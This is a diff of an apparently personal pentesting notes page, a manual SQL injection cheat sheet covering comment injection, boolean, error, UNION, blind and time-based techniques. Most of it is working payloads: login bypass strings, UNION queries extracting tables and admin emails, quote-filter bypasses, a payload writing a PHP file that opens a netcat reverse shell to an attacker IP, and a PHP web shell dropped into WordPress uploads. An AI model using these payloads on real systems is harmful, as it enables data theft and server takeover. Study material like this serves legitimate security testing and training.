@@ -6,17 +6,44 @@ TableOfContents: true
 tags:
   - pentesting
 ---
-
 # SQLi Cheat sheet for manual injection
 
 !!! example "Resources"
     - See a more detailed [explanation about SQL injection](webexploitation/sql-injection.md).
-    - [Payloads for different SQL databases](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection).
+    - [PayloadsAllTheThings Original payloads for different SQL databases](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection).
+
+!!! example "My cloned dictionaries"
+    - [MySQL injections](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/MySQL%20Injection.md).
+    - [MSSQL injections](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/MSSQL%20Injection.md).
+    - [PostgreSQL injections](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/PostgreSQL%20injection.md).
+    - [Oracle SQL injections](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/Oracle-SQL-injections.md).
+    - [SQLite injections](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/SQLite-injection.md).
 
 
-### Boolean-based testing
+## Comment injection
 
-#### Integer based parameter injection
+Put a line comment at the end to comment out the rest of the query.
+
+Valid for MySQL, SQL Server, PostgreSQL, Oracle, SQLite:
+
+```
+-- comment      // MySQL [Note the space after the double dash]
+--comment       // MSSQL
+--comment       // PostgreSQL
+--comment       // Oracle
+
+
+/*comment*/     // MySQL
+/*comment*/     // MSSQL
+/*comment*/     // PostgreSQL
+
+#comment        // MySQL
+
+```
+
+## Boolean-based testing
+
+### Integer based parameter injection
 
 Common in Integer based parameter injection such as:
 
@@ -44,7 +71,7 @@ And false
 
 ```
 
-#### String based parameter injection
+### String based parameter injection
 
 ```
 URL: https://site.com/user.php?id=alexis
@@ -63,7 +90,6 @@ Typical payloads for that query:
 "
 ```
 
-
 **Exploiting single quote (')**: In SQL, the single quote is used to delimit string literals. A way to exploit this is in a Login form:
 
 ```
@@ -79,7 +105,10 @@ SELECT * FROM users WHERE username = '' OR '1'='1'; -- ' AND password = '<passwo
 ```
 
 
-### Error-based testing
+## Error-based testing
+
+!!! example "Dictionaries"
+    [https://github.com/amandaguglieri/dictionaries/blob/main/SQL/error-based](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/error-based)
 
 Firstly, every DBMS/RDBMS responds to incorrect/erroneous SQL queries with different error messages, so an error response can be use to fingerprint the database:
 
@@ -98,26 +127,18 @@ to your MySQL server version for the right syntax to use near [query
 snippet]
 ```
 
-[Typical error based payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/error-based)
 
+## UNION attack
 
-### Manual UNION attack
+!!! example "Dictionaries"
+    [https://github.com/amandaguglieri/dictionaries/blob/main/SQL/union-select](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/union-select)
 
+### MYSQL
 
 ```
 #########
 MYSQL
 #########
-
-# 0. Comments 
---comment       // Oracle
---comment       // Microsoft
-/*comment*      // Microsoft
---comment       // PostgreSQL
-/*comment*/     // PostgreSQL
-#comment        // MySQL
--- comment      // MySQL [Note the space after the double dash]
-/*comment*/     // MySQL
 
 # Access (using null characters)
 ' OR '1'='1' %00
@@ -165,6 +186,7 @@ a' or '1'='1' union select tbl_name,2,3,4,5 from sqlite_master --
 
 ```
 
+### SQLite
 
 ```
 #########
@@ -244,25 +266,77 @@ union select 1,'example example',3,4,5 into outfile '/tmp/file.txt'
 
 # and we can combine that with a reverse shell like
 union select 1,'<?passthru("nc -e /bin/sh <attacker IP> <attacker port>") ?>', 3,4,5 into outfile '/tmp/reverse.php'
-
 ```
 
 
+## SQLi Blind attack
 
+Firstly you need to check the application response to different requests (and/or with false true statements). If you can tell true responses from false responses and validate that the application is processing the boolean values, then you can apply this technique. For that purpose the operator AND is more valuable. 
 
-### Manual SQLi Blind attack
+#### Boolean based
+
+!!! example "Dictionaries"
+    [https://github.com/amandaguglieri/dictionaries/blob/main/SQL/error-based](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/error-based)
 
 user() returns the name of the user currently using the database.
 substring() returns a substring of the given argument. It takes three parameters: the input string, the position of the substring and its length.
 
+Boolean based query:
+
 ```
 ' OR substring(user(), 1, 1) = 'a
 ' OR substring(user(), 1, 1) = 'b
+```
+
+More interesting queries:
+
+```
+# Database version
+1 and substring(version(), 1, 1) = 4--
+
+# Check that second character of the column user_email for user_name admin from table users is greater than the 'c' character  
+1 and substring((SELECT user_email FROM users WHERE user_name = 'admin'),2,1) > 'c'
+```
+
+#### Time based
+
+!!! example "Dictionaries"
+    [https://github.com/amandaguglieri/dictionaries/blob/main/SQL/time-based](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/time-based)
+
+!!! quote "Resources"
+    - [OWASP resources](https://owasp.org/www-community/attacks/Blind_SQL_Injection)
+
+Vulnerable SQL query:
+
+```SQL
+SELECT * from users WHERE username = '[username]' AND password = '[password]';
+```
+
+Time base query: 
+
+```
+' OR SLEEP(5) -- '
+```
+
+Interesting queries: 
+
+```
 1' AND SUBSTRING(user(), 1, 1 = 'r') sleep(0), sleep(10));#
 ```
 
 
-### Extra Bonus: Bypassing quotation marks
+Examples of available wait/timeout functions include:
+
+- `WAITFOR DELAY '0:0:10'` in SQL Server
+- `BENCHMARK()` and `sleep(10)` in MySQL
+- `pg_sleep(10)` in PostgreSQL
+
+```
+
+```
+
+
+## Extra Bonus: Bypassing quotation marks
 
 Sometimes quotation marks get filtered in SQL queries. To bypass that when querying some tablename, maybe we can skip quotation marks by entering tablename directly in HEX values.
 
@@ -288,7 +362,7 @@ More bypassing tips:
 ```
 
 
-### Extra Bonus: Gaining a reverse shell from SQL injection
+## Extra Bonus: Gaining a reverse shell from SQL injection
 
 Take a wordpress installation that uses a mysql database. If you manage to login into the mysql pannel (/phpmyadmin) as root then you could upload a php shell to the /wp-content/uploads/ folder.
 
@@ -296,7 +370,7 @@ Take a wordpress installation that uses a mysql database. If you manage to login
 Select "<?php echo shell_exec($_GET['cmd']);?>" into outfile "/var/www/https/blogblog/wp-content/uploads/shell.php";
 ```
 
-### Extra Bonus: DUAL
+## Extra Bonus: DUAL
 
 The DUAL is a special one row, one column table present by default in all Oracle databases. The owner of DUAL is SYS, but DUAL can be accessed by every user. This is a possible payload for SQLi:
 
